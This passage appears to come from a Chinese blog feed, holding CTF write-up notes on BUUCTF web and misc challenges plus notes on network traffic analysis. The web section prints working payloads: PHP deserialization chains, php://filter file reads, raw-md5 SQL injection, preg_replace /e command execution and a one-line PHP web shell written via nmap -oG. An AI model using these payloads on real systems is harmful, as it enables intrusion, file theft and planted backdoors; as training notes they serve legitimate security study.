alt="image-20231204150728572"></p><p>那就编码一下咯。。</p><pre><code>file=php://filter/read=convert.base64-encode/resource=flag.php</code></pre><h1 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h1><p>这里先区分一下：</p><blockquote><ol><li>Referer（引用页）：<ul><li>Referer是一个HTTP请求头部字段，用于标识请求来源页面的URL。当浏览器向服务器发起请求时，Referer字段将包含当前请求的上一个页面的URL。</li><li>这个字段的主要作用是帮助网站和开发者追踪访问来源，了解用户从哪个页面跳转而来。有时也用于防止跨站请求伪造（CSRF）攻击。</li></ul></li><li>X-Forwarded-For（XFF，代理服务器转发的用户IP地址）：<ul><li>X-Forwarded-For是一个非标准的HTTP请求头部字段，通常由代理服务器（如负载均衡器、反向代理等）添加到HTTP请求中，用于标识客户端的原始IP地址。</li><li>当请求通过代理服务器时，代理服务器会将请求发送者的IP地址添加到X-Forwarded-For头部，以便服务器知道请求的真实来源。</li><li>这对于那些通过代理服务器进行网站访问的情况非常有用，因为它允许服务器获取到实际客户端的IP地址，而不是代理服务器的地址。</li></ul></li></ol></blockquote><p>最后发包：</p><pre><code class="http">GET /Secret.php HTTP/1.1Host: node4.buuoj.cn:28318Cache-Control: max-age=0X-Forwarded-For:127.0.0.1Referer:https://Sycsecret.buuoj.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Syclover/119.0.0.0 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7Connection: close</code></pre><h1 id="php-大坑"><a href="#php-大坑" class="headerlink" title="*php   -大坑"></a>*php   -大坑</h1><p>[BUUCTF <a href="https://blog.csdn.net/weixin_45642610/article/details/112591542">极客大挑战 2019]PHP 1_buuojphp1-CSDN博客</a></p><p>拿到源码后，发现是一个反序列化</p><p>这里需要主义的是他的类属性是私有类，需要在变量名之前手动添加一个%00,因为打印时不会输出这个null，我们复制传入的时候需要手动添加一下</p><p>于此同时url识别不了<code>&quot;</code>，改为<code>%22</code></p><pre><code>?select=O:4:%22Name%22:3:&#123;s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;&#125;</code></pre><p>这里既然要通过url传递，也可以直接在php中urlencode一下：</p><pre><code>O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D#两个%3A中间的2=》3</code></pre><h1 id="Easy-Calc1"><a href="#Easy-Calc1" class="headerlink" title="Easy Calc1"></a>Easy Calc1</h1><p>主要是通过ASCII绕过waf</p><p>php中ord把字符串转换为asill，chr反之，它们一次都只能处理一个ascii字符</p><p>scandir可以扫描目录，file_get_contents读取文件内容</p><h1 id="Easy-MD5-1"><a href="#Easy-MD5-1" class="headerlink" title="Easy MD5 1"></a>Easy MD5 1</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110938697.png" alt="image-20231204190813477"></p><pre><code>select * from &#39;admin&#39; where password=md5($pass,true)</code></pre><p><em>md5(string,raw)</em></p><table><thead><tr><th>string</th><th>必需。要计算的字符串。</th></tr></thead><tbody><tr><td>raw</td><td>可选。默认不写为FALSE。32位16进制的字符串TRUE。16位原始二进制格式的字符串</td></tr></tbody></table><blockquote><p>ffifdyop</p><p>129581926211651571912466741651878684928 也可达同样的效果</p><p>总之，相当于 select * from admin where password&#x3D;’’or ture</p></blockquote><p>这里需要md5值碰撞出包含 <code>&#39; or &#39;</code>的值</p><pre><code class="php">&lt;?php for ($i = 0;;) &#123;  for ($c = 0; $c &lt; 1000000; $c++, $i++)  if (stripos(md5($i, true), &#39;&#39;or&#39;&#39;) !== false)   echo &quot;\nmd5($i) = &quot; . md5($i, true) . &quot;\n&quot;; echo &quot;.&quot;;&#125;?&gt;</code></pre><ul><li><a href="https://www.w3school.com.cn/php/func_string_strpos.asp">strpos()</a> - 查找字符串在另一字符串中第一次出现的位置（区分大小写）</li><li><a href="https://www.w3school.com.cn/php/func_string_strripos.asp">strripos()</a> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）</li><li><a href="https://www.w3school.com.cn/php/func_string_strrpos.asp">strrpos()</a> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）</li></ul><p>下一步：</p><pre><code>&lt;!--$a = $GET[&#39;a&#39;];$b = $_GET[&#39;b&#39;];if($a != $b &amp;&amp; md5($a) == md5($b))&#123;    // wow, glzjin wants a girl friend.--&gt;</code></pre><blockquote><p>不管是强类型还是弱类型，md5数组绕过就可以了</p></blockquote><h1 id="AreUSerialz"><a href="#AreUSerialz" class="headerlink" title="AreUSerialz"></a>AreUSerialz</h1><pre><code class="php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);class FileHandler &#123;    protected $op;    protected $filename;    protected $content;    function __construct() &#123;        $op = &quot;1&quot;;        $filename = &quot;/tmp/tmpfile&quot;;        $content = &quot;Hello World!&quot;;        $this-&gt;process();    &#125;    public function process() &#123;        if($this-&gt;op == &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;            $res = $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;    private function write() &#123;        if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) &#123;            if(strlen((string)$this-&gt;content) &gt; 100) &#123;                $this-&gt;output(&quot;Too long!&quot;);                die();            &#125;            $res = file_put_contents($this-&gt;filename, $this-&gt;content);            if($res) $this-&gt;output(&quot;Successful!&quot;);            else $this-&gt;output(&quot;Failed!&quot;);        &#125; else &#123;            $this-&gt;output(&quot;Failed!&quot;);        &#125;    &#125;    private function read() &#123;        $res = &quot;&quot;;        if(isset($this-&gt;filename)) &#123;            $res = file_get_contents($this-&gt;filename);        &#125;        return $res;    &#125;    private function output($s) &#123;        echo &quot;[Result]: &lt;br&gt;&quot;;        echo $s;    &#125;    function __destruct() &#123;        if($this-&gt;op === &quot;2&quot;)            $this-&gt;op = &quot;1&quot;;        $this-&gt;content = &quot;&quot;;        $this-&gt;process();    &#125;&#125;function is_valid($s) &#123;    for($i = 0; $i &lt; strlen($s); $i++)        if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))            return false;    return true;&#125;if(isset($_GET&#123;&#39;str&#39;&#125;)) &#123;    $str = (string)$_GET[&#39;str&#39;];    if(is_valid($str)) &#123;        $obj = unserialize($str);    &#125;&#125;</code></pre><p>pop链子，我们先看看我们需要触发的函数，这里显然时read()中的file_get_content(),以此达到一个文件读取，再往前看：</p><pre><code class="php"> public function process() &#123;        if($this-&gt;op == &quot;1&quot;) &#123;            $this-&gt;write();        &#125; else if($this-&gt;op == &quot;2&quot;) &#123;            $res = $this-&gt;read();            $this-&gt;output($res);        &#125; else &#123;            $this-&gt;output(&quot;Bad Hacker!&quot;);        &#125;    &#125;</code></pre><p>这里op&#x3D;2时可以触发read(),再追溯process，发现构造和析构时都调用了，构造函数反序列化时无法触发，只能看析构函数，析构函数我们发现是强等于“2”，那我们传入int 2就可以绕过第一个赋值，故payload：</p><pre><code class="php">&lt;?phpclass FileHandler &#123;    protected $op=2;    protected $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;    protected $content=&quot;233&quot;;&#125;$a=new FileHandler;echo serialize($a);</code></pre><p>&#x3D;&#x3D;&gt;</p><pre><code>O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;i:2;s:11:&quot;*filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:10:&quot;*content&quot;;s:3:&quot;233&quot;;&#125;</code></pre><p>protected属性会在变量名前添加标记%00*%00，所以手动补充一下</p><pre><code>O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;%00*%00op&quot;;i:2;s:11:&quot;%00*%00filename&quot;;s:57:&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;s:10:&quot;%00*%00content&quot;;s:3:&quot;233&quot;;&#125;</code></pre><p>发现这里有一个问题，这道题过滤了不可打印字符，%00是null这种不可打印的，所以把类属性改为public：</p><pre><code class="php">&lt;?php    class FileHandler &#123;        public $op = 2;        public $filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;        public $content;    &#125;    $a = new FileHandler();        $b = serialize($a);        echo($b);?&gt;</code></pre><h1 id="Blacklist"><a href="#Blacklist" class="headerlink" title="Blacklist"></a>Blacklist</h1><p>刚开始以为又是<code>随便注</code>那道题，发现预编译也被ban了，看来只能使用句柄了：</p><pre><code>handler `FlagHere` open as p;handler p read first;</code></pre><p>使用</p><pre><code>handler p read next;</code></pre><p>可以接着往下遍历</p><h1 id="Easy-Java"><a href="#Easy-Java" class="headerlink" title="*Easy Java"></a>*Easy Java</h1><p>第一次遇到文件下载漏洞</p><p>[<a href="https://www.cnblogs.com/Cl0ud/p/12177085.html">RoarCTF 2019]Easy Java - 春告鳥 - 博客园 (cnblogs.com)</a></p><pre><code> WEB-INF主要包含一下文件或目录：    /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。    /WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中    /WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件    /WEB-INF/src/：源码目录，按照包名结构放置各个java文件。    /WEB-INF/database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码 </code></pre><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110938698.png" alt="image-20231205165146499"></p><p>后一步</p><pre><code>filename=/WEB-INF/classes/com/wm/ctf/FlagController.class</code></pre><p>这里在bp中读取好像可以直接反编译，使用idea等编译器也可以读取到</p><h1 id="phpweb"><a href="#phpweb" class="headerlink" title="phpweb"></a>phpweb</h1><p>这道题有两个做法可以绕过黑名单，一个是直接 \exec 这样绕过，第二种则是反序列化。这里之所以可以反序列化主要是他提供了一个类，并且析构时可以调用任意方法，此时我们可以指定它执行反序列化，反序列化时的方法不会受到黑名单影响</p><h1 id="ZJCTF，不过如此"><a href="#ZJCTF，不过如此" class="headerlink" title="*ZJCTF，不过如此"></a>*ZJCTF，不过如此</h1><p>这道题感觉做过，只是next中的函数有变化</p><pre><code>&lt;?php$id = $_GET[&#39;id&#39;];$_SESSION[&#39;id&#39;] = $id;function complex($re, $str) &#123;    return preg_replace(        &#39;/(&#39; . $re . &#39;)/ei&#39;,        &#39;strtolower(&quot;\\1&quot;)&#39;,        $str    );&#125;foreach($_GET as $re =&gt; $str) &#123;    echo complex($re, $str). &quot;\n&quot;;&#125;function getFlag()&#123;    @eval($_GET[&#39;cmd&#39;]);&#125;</code></pre><blockquote><p>这里的漏洞出在<strong>preg_replace</strong> <strong>&#x2F;e</strong> 模式下</p><p>e模式下的preg_replace可以让第二个参数’替换字符串’当作代码执行，但是这里第二个参数是不可变的，但因为有这种特殊的情况，正则表达式模式或部分模式两边添加圆括号会将相关匹配存储到一个临时缓存区，并且从1开始排序，而strtolower(“\1”)正好表达的就是匹配区的第一个（\1&#x3D;\1），从而我们如果匹配可以，则可以将函数实现。<br>比如我们传入 ?.<em>&#x3D;**{${phpinfo()}}*</em></p><p>原句：preg_replace(‘&#x2F;(‘ . $re . ‘)&#x2F;ei’,’strtolower(“\1”)’,$str); 就变成preg_replace(‘&#x2F;(‘ .* ‘)&#x2F;ei’,’strtolower(“\1”)’,<strong>{${phpinfo()}}</strong>);</p><p>又因为$_GET传入首字母是非法字符时候会把  .（点号）改成下划线，因此得将.<em>换成\s</em></p><p>所有payload：?\S*&#x3D;${getFlag()}&amp;cmd&#x3D;system(‘ls &#x2F;‘); </p><p>[<a href="https://www.cnblogs.com/l0vehzzz/p/16415836.html">BJDCTF2020]ZJCTF，不过如此 - L0VEhzzz - 博客园 (cnblogs.com)</a></p></blockquote><p>这里的解释比较麻烦，看看这个：</p><p><a href="https://blog.csdn.net/giaogiao123/article/details/121217533">php代码审计之preg_replace函数_php preg_replace-CSDN博客</a></p><p>姑且记住payload：</p><p>\S*&#x3D;${getFlag()}&amp;cmd&#x3D;system(‘ls &#x2F;‘); </p><p>回到这道题，payload1：</p><pre><code>\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#39;ls /&#39;); </code></pre><p>通过preg_replace去调用getFlag函数，进一步传参cmd进行命令执行</p><p>payload2：蚁剑连接</p><pre><code>\S*=$&#123;@eval($_POST[cmd])&#125;</code></pre><h1 id="Online-Tool-1"><a href="#Online-Tool-1" class="headerlink" title="Online Tool 1"></a>Online Tool 1</h1><p>函数escapeshellarg的作用是把字符串转码为可以在 shell 命令里使用的参数，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</p><p>函数escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。</p><p>反斜线（\）会在以下字符之前插入： &amp;#;&#96;|*?~&lt;&gt;^()[]{}$, \x0A 和 \xFF。 ’ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。</p><p>参数<code>-oG</code>可以将命令和结果写到同一个文件上</p><p>可以直接传一句话木马</p><pre><code class="php">?host=&#39; &lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; -oG test.php &#39;</code></pre><p>还有一种做法就是直接把命令改成读取flag文件</p><pre><code class="php">?host=&#39; &lt;?php echo `cat /flag`;?&gt; -oG test.php &#39;</code></pre><h1 id="禁止套娃"><a href="#禁止套娃" class="headerlink" title="禁止套娃"></a>禁止套娃</h1><p>无参数RCE</p><p>exp&#x3D;highlight_file(next(array_reverse(scandir(pos(localeconv())))));</p><pre><code>highlight_file() 函数对文件进行语法高亮显示，本函数是show_source() 的别名next() 输出数组中的当前元素和下一个元素的值。array_reverse() 函数以相反的元素顺序返回数组。(主要是能返回值)scandir() 函数返回指定目录中的文件和目录的数组。pos() 输出数组中的当前元素的值。localeconv() 函数返回一个包含本地数字及货币格式信息的数组，该数组的第一个元素就是&quot;.&quot;。</code></pre><p>session_id() 可以用来获取&#x2F;设置 当前会话 ID。<br>在我们使用 session_id()的时候 需要使用session_start()来开启session会话<br>我们尝试构造payload</p><pre><code>?exp=highlight_file( session_id(session_start()));</code></pre><p>session_id(session_start())<br>使用session之前需要通过session_start()告诉PHP使用session，php默认是不主动使用session的。<br>session_id()可以获取到当前的session id。</p><p>抓包：</p><pre><code>cookie: PHPSESSID=flag.php</code></pre><h1 id="misc————"><a href="#misc————" class="headerlink" title="misc————"></a>misc————</h1><h1 id="两个部分的flag"><a href="#两个部分的flag" class="headerlink" title="两个部分的flag"></a>两个部分的flag</h1><p>有一部分居然在图片属性里面</p><p>steghide没能提取png的信息，zsteg直接就出来了</p><h1 id="压缩文件的快乐"><a href="#压缩文件的快乐" class="headerlink" title="压缩文件的快乐"></a>压缩文件的快乐</h1><p>这里补充一下伪加密：</p><pre><code>压缩源文件数据区：50 4B 03 04：这是头文件标记（0x04034b50）14 00：解压文件所需 pkware 版本00 00：全局方式位标记（有无加密）08 00：压缩方式5A 7E：最后修改文件时间F7 46：最后修改文件日期16 B5 80 14：CRC-32校验（1480B516）19 00 00 00：压缩后尺寸（25）17 00 00 00：未压缩尺寸（23）07 00：文件名长度00 00：扩展记录长度压缩源文件目录区：50 4B 01 02：目录中文件文件头标记(0x02014b50)3F 00：压缩使用的 pkware 版本14 00：解压文件所需 pkware 版本00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了，当数字为奇数是为加密，为偶数时不加密）08 00：压缩方式5A 7E：最后修改文件时间F7 46：最后修改文件日期16 B5 80 14：CRC-32校验（1480B516）19 00 00 00：压缩后尺寸（25）17 00 00 00：未压缩尺寸（23）07 00：文件名长度24 00：扩展字段长度00 00：文件注释长度00 00：磁盘开始号00 00：内部文件属性20 00 00 00：外部文件属性00 00 00 00：局部头部偏移量压缩源文件目录结束标志：50 4B 05 06：目录结束标记00 00：当前磁盘编号00 00：目录区开始磁盘编号01 00：本磁盘上纪录总数01 00：目录区中纪录总数59 00 00 00：目录区尺寸大小3E 00 00 00：目录区对第一张磁盘的偏移量00 00：ZIP 文件注释长度</code></pre><p>我们一般修改的是50 4B 01 02 14 00 01 00 &#x3D;&#x3D;》50 4B 0<code>1</code> 02 14 00 0<code>0</code> 00</p><p>这道题修改伪加密后解压软件报错的话，换成WinRAR或者检查修改位置是否正确</p><p>最后使用明文攻击：</p><pre><code>我们为zip压缩文件所设定的密码，首先被转换成3个32bit的key，所以可能的key的组合是2^96，这是个天文数字如果用暴力穷举的方式是不太可能的，除非你的密码比较短或者有个厉害的字典。压缩软件用这3个key加密所有包中的文件，也就是说，所有文件的key是一样的，如果我们能够找到这个key，就能解开所有的文件。如果我们找到加密压缩包中的任意一个文件，这个文件和压缩包里的文件是一样的我们把这个文件用同样的压缩软件同样的压缩方式进行无密码的压缩，得到的文件就是我们的Known plaintext（已知明文）。用这个无密码的压缩包和有密码的压缩包进行比较，分析两个包中相同的那个文件，抽取出两个文件的不同点，就是那3个key了，如此就能得到key。两个相同文件在压缩包中的字节数应该相差12个byte，就是那3个key了。虽然我们还是无法通过这个key还原出密码，但是我们已经可以用这个key解开所有的文件，所以已经满足我们的要求了，毕竟对我们而言，得到解压后的文件比得到密码本身更重要。</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;warmUp1&quot;&gt;&lt;a href=&quot;#warmUp1&quot; class=&quot;headerlink&quot; title=&quot;warmUp1&quot;&gt;&lt;/a&gt;warmUp1&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?php
    highlight_file(__FILE__);
   </summary>
      
    
    
    
    
    <category term="CTF" scheme="https://taninluv.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>MISC-NTA</title>
    <link href="https://taninluv.github.io/2023/11/28/MISC-NTA/"/>
    <id>https://taninluv.github.io/2023/11/28/MISC-NTA/</id>
    <published>2023-11-28T12:12:13.000Z</published>
    <updated>2024-07-11T01:40:42.674Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://academy.hackthebox.com/module/81/section/963">Intro to Network Traffic Analysis (hackthebox.com)</a></p><h1 id="基础介绍"><a href="#基础介绍" class="headerlink" title="基础介绍"></a>基础介绍</h1><h2 id="OSI"><a href="#OSI" class="headerlink" title="OSI"></a>OSI</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110939343.png" alt="image-20231128201404021"></p><h2 id="协议数据单元（PDU）"><a href="#协议数据单元（PDU）" class="headerlink" title="协议数据单元（PDU）"></a>协议数据单元（PDU）</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110939344.png" alt="image-20231128201442632"></p><h2 id="TCP三路握手"><a href="#TCP三路握手" class="headerlink" title="TCP三路握手"></a>TCP三路握手</h2><p>TCP确保数据从服务器传递到客户端的方法之一是会话的利用率。这些会话是通过所谓的三方握手建立的。为了实现这一点，TCP在TCP标头中使用了一个名为flags的选项。我们现在不会深入研究TCP标志；要知道，我们将在三方握手中看到的常见标志是同步（SYN）和确认（ACK）。当主机请求通过TCP与服务器进行对话时；</p><ul><li><p>客户端发送SYN标志设置为开启的数据包，以及TCP报头中的其他可协商选项。</p><ul><li>这是一个同步数据包。它将只在来自主机和服务器的第一个数据包中设置，并通过允许两端就开始通信的序列号达成一致来建立会话。</li><li>这对于数据包的跟踪至关重要。除了序列号同步，在这个阶段还协商了许多其他选项，包括窗口大小、最大段大小和选择性确认。</li></ul></li><li><p>服务器将用TCP数据包进行响应，该TCP数据包包括为序列号协商设置的SYN标志和为确认主机发送的先前SYN数据包设置的ACK标志。</p><ul><li>服务器还将包括对TCP标头的选项字段中所需设置的TCP选项的任何更改。</li></ul></li><li><p>客户端将使用TCP数据包进行响应，该TCP数据包具有同意协商的ACK标志集。 该数据包是三方握手的结束，并建立了客户端和服务器之间的连接。</p></li></ul><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110939346.png" alt="image-20231128202614334"></p><p>当检查这个输出时，我们可以在第一行看到握手的开始。查看红框中突出显示的信息，我们可以看到我们的初始Syn标志已设置。如果我们看一下绿色下划线的端口号，我们可以看到两个数字，57678和80。第一个数字是客户端使用的随机高端口号，第二个是服务器用来侦听传入web请求连接的HTTP的众所周知的端口。在第2行中，我们可以看到服务器对客户端的响应，其中SYN&#x2F;ACK数据包发送到相同的端口。在第3行，我们可以看到客户端确认服务器的同步数据包以建立连接。</p><p><a href="https://blog.csdn.net/jingzhi111/article/details/90668616">计算机网络—02：TCP的三报文握手和四报文握手-CSDN博客</a></p><blockquote><p>最开始，A、B：CLOSED（关闭）状态，A、B都创建传输控制块TCB。<br>第一个：A向B发送 连接请求报文段（同步位SYN&#x3D;1，不能携带数据，初始序号 seq&#x3D;x）；<br>A发送后：SYN-SENT（同步已发送）状态；B：LISTEN（收听）状态。<br>第二个：B向A发送 确认报文段（SYN&#x3D;1，ACK&#x3D;1，确认号ack&#x3D;x+1，不能携带数据，初始序号 seq&#x3D;y）；<br>B收到并发送后：SYN-RCVD（同步收到）状态。<br>第三个：A向B发送 确认报文段（ACK&#x3D;1，ack&#x3D;y+1，序号seq&#x3D;x+1，携带数据消耗序号，不携带不消耗）；<br>A收到并发送后：ESTAB-LISHED（已建立连接）状态。<br>B收到后：ESTAB-LISHED（已建立连接）状态。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20190603235435593.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppbmd6aGkxMTE=,size_16,color_FFFFFF,t_70" alt="img"></p><blockquote><p>为什么A最后还要发送一次确认？</p><p>主要是为了防止<strong>已失效的连接请求报文段</strong>（A向B发送的第一个报文段延误到连接释放以后的某个时间）突然又传送到了B，让B误以为A又发出了一次新的连接请求，因而产生错误。</p></blockquote><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h4 id="HTTP-Methods"><a href="#HTTP-Methods" class="headerlink" title="HTTP Methods"></a>HTTP Methods</h4><p>**HEAD:**required是一种安全的方法，它从服务器请求响应，类似于Get请求，只是不包括消息正文。这是获取有关服务器及其操作状态的更多信息的好方法。</p><p><strong>OPTIONS：</strong>可选OPTIONS方法可以收集服务器识别的支持HTTP方法的信息。通过这种方式，我们可以确定与特定资源或服务器交互的需求，而无需实际向其请求数据或对象。</p><h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><p>HTTPS HTTP安全（HTTPS）是对HTTP协议的一种修改，旨在利用传输层安全（TLS）或安全套接字层（SSL）与旧应用程序进行数据安全。TLS被用作加密机制，以确保客户端和服务器之间的通信安全。TLS可以将常规HTTP流量封装在TLS中，这意味着我们可以加密整个会话，而不仅仅是发送或请求的数据。在TLS机制建立之前，我们很容易受到中间人攻击和其他类型的侦察或劫持，这意味着与客户端或服务器在同一局域网中的任何人都可以查看网络流量，如果他们正在窃听。我们现在可以在浏览器中实现安全性，使每个人都能加密自己的网络习惯、搜索请求、会话或数据传输、银行交易等等。 尽管HTTPS的基础是HTTP，但HTTPS使用端口443和8443而不是标准端口80。这是客户端向服务器发出希望建立安全连接的信号的一种简单方式。让我们看一看HTTPS流量的输出，并在一分钟内了解TLS握手是如何工作的。</p><h4 id="TLS-Handshake-Via-HTTPS"><a href="#TLS-Handshake-Via-HTTPS" class="headerlink" title="TLS Handshake Via HTTPS"></a>TLS Handshake Via HTTPS</h4><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110939347.png" alt="image-20231128204101092"></p><p>在前几个数据包中，我们可以看到客户端使用蓝色框中的端口443建立了与服务器的会话。这向服务器发出信号，表示它希望使用HTTPS作为应用程序通信协议。 一旦通过TCP启动会话，接下来将发送TLS ClientHello以开始TLS握手。在握手过程中，会商定几个参数，包括会话标识符、对等x509证书、要使用的压缩算法、密码规范加密算法（如果会话可恢复）以及客户端和服务器之间共享的48字节主密钥，以验证会话。 一旦会话建立，所有数据和方法都将通过TLS连接发送，并显示为TLS应用程序数据，如红框中所示。TLS仍在使用TCP作为其传输协议，因此我们仍将看到来自端口443的流的确认数据包。 总结握手：</p><p>总结握手： </p><ul><li>客户端和服务器交换问候消息以就连接参数达成一致。</li><li>客户端和服务器交换必要的加密参数以建立预主密钥。</li><li>客户端和服务器将交换x.509证书和加密信息，以便在会话中进行身份验证。 从预主密钥生成主密钥并交换随机值。</li><li>客户端和服务器向TLS协议的记录层部分发布协商的安全参数。</li><li>客户端和服务器验证其对等方是否计算了相同的安全参数，以及握手是否在未被攻击者篡改的情况下进行。</li></ul><p> 加密本身是一个复杂而冗长的主题，值得拥有自己的模块。本节简单总结了HTTP和TLS如何在HTTPS应用程序协议中提供安全性。有关HTTPS如何工作以及TLS如何执行安全操作的更多信息，请参阅RFC:2246。</p><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>FTP通过TCP使用端口20和21。端口20用于数据传输，而端口21用于发出控制FTP会话的命令。关于身份验证，FTP支持用户身份验证，并允许匿名访问（如果配置）。 FTP可以在两种不同的模式下运行，主动模式或被动模式。Active是FTP使用的默认操作方法，这意味着服务器侦听来自客户端的控制命令PORT，说明要使用哪个端口进行数据传输。被动模式使我们能够访问位于防火墙后面的FTP服务器或启用NAT的链接，这使得直接TCP连接变得不可能。在这种情况下，客户端将发送PASV命令，并等待来自服务器的响应，通知客户端要使用什么IP和端口进行数据传输通道连接。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110939348.png" alt="image-20231128204551224"></p><p>上图显示了通过FTP命令通道发出的请求的几个示例绿色箭头，以及从FTP服务器发回的响应蓝色箭头。这都是很标准的东西。有关每个命令及其执行的操作的列表，请查看下表。 当查看FTP流量时，我们可以看到通过端口21传递的一些常见命令包括：</p><table><thead><tr><th><code>USER</code></th><th>specifies the user to log in as.</th></tr></thead><tbody><tr><td><code>PASS</code></td><td>sends the password for the user attempting to log in.</td></tr><tr><td><code>PORT</code></td><td>when in active mode, this will change the data port used.</td></tr><tr><td><code>PASV</code></td><td>switches the connection to the server from active mode to passive.</td></tr><tr><td><code>LIST</code></td><td>displays a list of the files in the current directory.</td></tr><tr><td><code>CWD</code></td><td>will change the current working directory to one specified.</td></tr><tr><td><code>PWD</code></td><td>prints out the directory you are currently working in.</td></tr><tr><td><code>SIZE</code></td><td>will return the size of a file specified.</td></tr><tr><td><code>RETR</code></td><td>retrieves the file from the FTP server.</td></tr><tr><td><code>QUIT</code></td><td>ends the session.</td></tr></tbody></table><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>像任何其他使用TCP作为传输机制的应用程序一样，它将执行标准功能，如三方握手和确认接收到的数据包。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110939349.png" alt="image-20231128204834352"></p><p>查看上图，我们可以看到它在每次建立会话橙色框时都会执行TCP握手。当查看源和目标端口蓝框时，端口445正在被利用，通过TCP发送SMB流量信号。如果我们看一下绿框，信息字段告诉我们SMB通信中发生了什么。在这个例子中，有很多错误，这是一个需要深入研究的例子。来自用户的一到两次身份验证失败相对常见，但重复的大量身份验证失败可能表明潜在的未经授权的个人试图访问用户的帐户或使用其凭据进行移动。这是攻击者的一种常见策略，他们会抓住经过身份验证的用户，窃取他们的凭据，利用它们进行横向移动，或者访问他们通常会被拒绝访问的资源。 这只是SMB使用的一个示例。我们将看到的另一个常见问题是服务器和主机之间的文件共享访问。在大多数情况下，这是定期沟通。但是，如果我们看到主机访问其他主机上的文件共享，这并不常见。请注意谁在请求连接、在哪里以及他们在做什么。</p><h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>现在考虑一下。如果没有我们日常网络流量的基线，我们怎么知道该网络的典型情况？在捕获时间范围内，我们获取了大量信息，我们需要清除其中的一些信息。此过程可能需要花费大量时间，因为我们必须检查每个对话以确保它正常，确定我们看到的主机是否属于网络或流氓资产等等。这个过程很快成为一项艰巨的任务，对吧？</p><p>通过此方案和对网络基线的访问，我们可以快速剥离已知良好的通信。利用数据分析工具（例如 Wireshark 中的顶级通信者模块）可以帮助识别可能正在发送大量数据的主机。我们可以根据主机的正常基线进行检查，以确定它是否不正常。另一种方法是查看内部主机或公共和不通用端口之间的连接。由于我们可以清除视图，我们现在可以看到多个用户主机在端口 8080 和 445 上连接。端口本身并不奇怪，但事实是两台用户 PC 通过这些端口相互通信。Web 流量通常从主机流向托管的 Web 服务器或托管业务应用程序的 Intranet Web 服务器。SMB 流量也是如此。看到两个主机通过此端口相互通信是非常可疑的。根据我们现在所知道的情况，我们可以快速发送故障单，寻求帮助，立即处理潜在的违规行为。</p><h1 id="TCPDUMP"><a href="#TCPDUMP" class="headerlink" title="TCPDUMP"></a>TCPDUMP</h1><p>这里为了备考这个板块姑且先跳过</p><h1 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110939350.png" 